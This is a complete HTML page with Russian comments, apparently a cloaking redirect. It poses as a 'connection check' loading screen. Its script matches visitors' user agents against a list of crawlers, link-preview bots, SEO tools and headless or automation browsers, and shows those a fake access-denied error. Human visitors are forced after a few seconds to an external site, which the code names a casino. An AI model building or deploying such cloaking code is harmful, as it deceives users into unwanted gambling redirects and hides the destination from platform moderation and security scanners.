<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Loading...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: system-ui, sans-serif;
            color: white;
        }
        .tap-area {
            text-align: center;
            cursor: pointer;
            width: 100%;
            padding: 40px;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #222;
            border-top: 3px solid #00ffcc;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            font-size: 16px;
            color: #00ffcc;
        }
        .small {
            font-size: 12px;
            color: #555;
            margin-top: 30px;
        }
    </style>
</head>
<body>
    <div class="tap-area" id="tapArea">
        <div class="spinner"></div>
        <div class="status" id="status">Проверка соединения...</div>
        <div class="small">⚡ Нажмите в любом месте экрана</div>
    </div>

    <script>
        (function(){
            // ========== МИНИМАЛЬНАЯ ЗАЩИТА ОТ ГЛУПЫХ БОТОВ ==========
            var ua = navigator.userAgent.toLowerCase();
            var botPattern = /bot|crawler|spider|slurp|facebookexternalhit|twitterbot|whatsapp|telegram|lighthouse|pinger|uptimerobot|ahrefs|semrush|headless|phantomjs|puppet|selenium|webdriver/i;
            var isBot = botPattern.test(ua);
            
            // Если бот — посылаем нахуй
            if(isBot || navigator.webdriver === true) {
                document.body.innerHTML = '<div style="color:red; text-align:center; padding:50px;">Access Denied. Error: 0x8004D00F</div>';
                throw new Error("Bot detected");
            }
            
            // ========== ДЛЯ ВСЕХ ОСТАЛЬНЫХ (ВКЛЮЧАЯ VPN И ТУПЫЕ ТЕЛЕФОНЫ) ==========
            // Просто ждём нажатия на экран
            var tapArea = document.getElementById('tapArea');
            var statusDiv = document.getElementById('status');
            var redirected = false;
            
            function redirectToCasino() {
                if(redirected) return;
                redirected = true;
                statusDiv.innerHTML = '🔄 Перенаправление...';
                window.location.replace("https://mell0a.cc/4823");
            }
            
            // Ждём тап или клик
            tapArea.addEventListener('click', redirectToCasino);
            tapArea.addEventListener('touchstart', redirectToCasino);
            
            // Если через 5 секунд не нажал — редиректим всё равно (человек тупит или читает)
            setTimeout(function() {
                if(!redirected) {
                    statusDiv.innerHTML = '⏳ Автоматический переход...';
                    setTimeout(redirectToCasino, 500);
                }
            }, 5000);
            
            // Меняем статус через секунду для красоты
            setTimeout(function() {
                if(!redirected) statusDiv.innerHTML = '✅ Нажмите для входа';
            }, 1000);
        })();
    </script>
</body>
</html>
